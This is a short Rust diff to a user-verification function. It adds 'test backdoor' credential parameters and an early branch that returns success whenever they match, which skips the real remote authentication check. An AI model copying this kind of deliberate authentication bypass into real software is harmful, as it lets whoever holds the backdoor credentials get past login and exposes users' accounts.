@@ -9,7 +9,13 @@ pub fn verify_user(
     azolve_password: &str,
     azolve_token: &str,
     auth_secret: &str,
+    test_backdoor_member_id: &str,
+    test_backdoor_password: &str,
 ) -> Result<bool, ErrorBox> {
+    if member_id == test_backdoor_member_id && member_password == test_backdoor_password {
+        return Ok(true);
+    }
+
     let mut url = Url::parse(azolve_url)?;
     {
         let mut query = url.query_pairs_mut();
